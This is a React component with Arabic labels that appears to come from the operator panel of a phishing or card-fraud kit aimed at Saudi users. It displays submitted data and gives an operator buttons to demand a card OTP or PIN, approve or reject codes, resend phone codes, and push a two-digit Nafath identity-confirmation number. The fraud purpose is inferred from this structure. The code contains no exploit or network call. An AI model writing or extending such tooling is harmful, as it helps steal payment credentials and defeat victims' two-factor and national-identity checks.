"use client"

import { useState } from "react"
import { Check, X, RefreshCw } from "lucide-react"

interface DataBubbleProps {
  title: string
  data: Record<string, any>
  timestamp?: Date
  showCardActions?: boolean
  showOtpActions?: boolean
  showPhoneActions?: boolean
  showNafadInput?: boolean
  onCardOtp?: () => void
  onCardPin?: () => void
  onCardReject?: () => void
  onOtpApprove?: () => void
  onOtpReject?: () => void
  onPhoneApprove?: () => void
  onPhoneReject?: () => void
  onPhoneResend?: () => void
  onNafadSubmit?: (code: string) => void
}

export function DataBubble({
  title,
  data,
  timestamp,
  showCardActions,
  showOtpActions,
  showPhoneActions,
  showNafadInput,
  onCardOtp,
  onCardPin,
  onCardReject,
  onOtpApprove,
  onOtpReject,
  onPhoneApprove,
  onPhoneReject,
  onPhoneResend,
  onNafadSubmit
}: DataBubbleProps) {
  const [nafadCode, setNafadCode] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)

  const handleNafadSubmit = async () => {
    if (nafadCode.length !== 2 || isSubmitting) return
    
    setIsSubmitting(true)
    try {
      await onNafadSubmit?.(nafadCode)
      setNafadCode("")
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <div className="bg-white rounded-lg shadow-sm p-6 border border-gray-200" style={{ fontFamily: 'Cairo, Tajawal, sans-serif' }}>
      {/* Header */}
      <div className="flex items-center justify-between mb-4 pb-3 border-b border-gray-100">
        <h3 className="text-lg font-bold text-gray-900">{title}</h3>
        {timestamp && (
          <span className="text-sm text-gray-500">
            {new Date(timestamp).toLocaleString('ar-SA', {
              year: 'numeric',
              month: 'short',
              day: 'numeric',
              hour: '2-digit',
              minute: '2-digit'
            })}
          </span>
        )}
      </div>

      {/* Data Fields */}
      <div className="space-y-3">
        {Object.entries(data).map(([key, value]) => (
          <div key={key} className="flex justify-between items-start">
            <span className="text-sm font-medium text-gray-600">{key}:</span>
            <span className="text-sm text-gray-900 font-semibold text-right max-w-[60%]">
              {value?.toString() || "-"}
            </span>
          </div>
        ))}
      </div>

      {/* Card Actions */}
      {showCardActions && (
        <div className="flex gap-2 mt-4 pt-4 border-t border-gray-100">
          <button
            onClick={onCardOtp}
            className="flex-1 px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-sm font-medium transition-colors"
          >
            OTP
          </button>
          <button
            onClick={onCardPin}
            className="flex-1 px-4 py-2 bg-purple-600 hover:bg-purple-700 text-white rounded-lg text-sm font-medium transition-colors"
          >
            PIN
          </button>
          <button
            onClick={onCardReject}
            className="flex-1 px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg text-sm font-medium transition-colors"
          >
            رفض
          </button>
        </div>
      )}

      {/* OTP Actions */}
      {showOtpActions && (
        <div className="flex gap-2 mt-4 pt-4 border-t border-gray-100">
          <button
            onClick={onOtpApprove}
            className="flex-1 flex items-center justify-center gap-2 px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg text-sm font-medium transition-colors"
          >
            <Check className="w-4 h-4" />
            قبول
          </button>
          <button
            onClick={onOtpReject}
            className="flex-1 flex items-center justify-center gap-2 px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg text-sm font-medium transition-colors"
          >
            <X className="w-4 h-4" />
            رفض
          </button>
        </div>
      )}

      {/* Phone Actions */}
      {showPhoneActions && (
        <div className="flex gap-2 mt-4 pt-4 border-t border-gray-100">
          <button
            onClick={onPhoneApprove}
            className="flex-1 flex items-center justify-center gap-2 px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg text-sm font-medium transition-colors"
          >
            <Check className="w-4 h-4" />
            موافقة
          </button>
          <button
            onClick={onPhoneReject}
            className="flex-1 flex items-center justify-center gap-2 px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg text-sm font-medium transition-colors"
          >
            <X className="w-4 h-4" />
            رفض الرقم
          </button>
          <button
            onClick={onPhoneResend}
            className="flex-1 flex items-center justify-center gap-2 px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-sm font-medium transition-colors"
          >
            <RefreshCw className="w-4 h-4" />
            إعادة الكود
          </button>
        </div>
      )}

      {/* Nafad Input */}
      {showNafadInput && (
        <div className="mt-4 pt-4 border-t border-gray-100">
          <label className="block text-sm font-medium text-gray-700 mb-2">
            أدخل رقم التأكيد (رقمين)
          </label>
          <div className="flex gap-2">
            <input
              type="text"
              value={nafadCode}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '')
                if (value.length <= 2) setNafadCode(value)
              }}
              placeholder="مثال: 43"
              maxLength={2}
              className="flex-1 px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500 text-center text-lg font-bold"
            />
            <button
              onClick={handleNafadSubmit}
              disabled={nafadCode.length !== 2 || isSubmitting}
              className="px-6 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg text-sm font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isSubmitting ? "جاري الإرسال..." : "إرسال"}
            </button>
          </div>
        </div>
      )}
    </div>
  )
}
